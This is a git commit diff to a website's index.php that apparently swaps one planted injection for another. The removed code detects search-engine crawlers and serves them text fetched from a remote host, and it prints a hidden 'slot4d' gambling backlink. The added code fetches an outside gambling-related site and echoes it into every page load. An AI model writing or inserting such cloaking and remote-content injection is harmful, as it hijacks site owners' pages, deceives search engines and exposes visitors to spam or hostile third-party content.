30d2efdd1ec7fd6956c0b92f4a79746c1c18b756
killuaa999 <koitt.fajar@gmail.com>
2025-01-01 16:04:38 +0700

    index.php

--- index.php
+++ index.php
@@ -1,27 +1,6 @@
-<?php
-function is_bot() {
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
-    
-    foreach ($bots as $bot) {
-        if (stripos($user_agent, $bot) !== false) {
-            return true;
-        }
-    }
-    
-    return false;
-}
-
-if (is_bot()) {
-    $message = file_get_contents('https://kiko.avatar-amp.info/musicaljr.com/index.txt');#NAROLINK
-    echo $message;
-}
-
-// Menambahkan Backlink Tersembunyi
-echo '<ul style="display:none">';
-echo '<li style="color: #000000;"><a href="https://www.milrosas.com/">slot4d</a></li>';
-echo '</ul>';
-
+<?php 
+$a = file_get_contents('https://www.milrosas.com/'); 
+echo $a; 
 ?>
 <?php
 /*
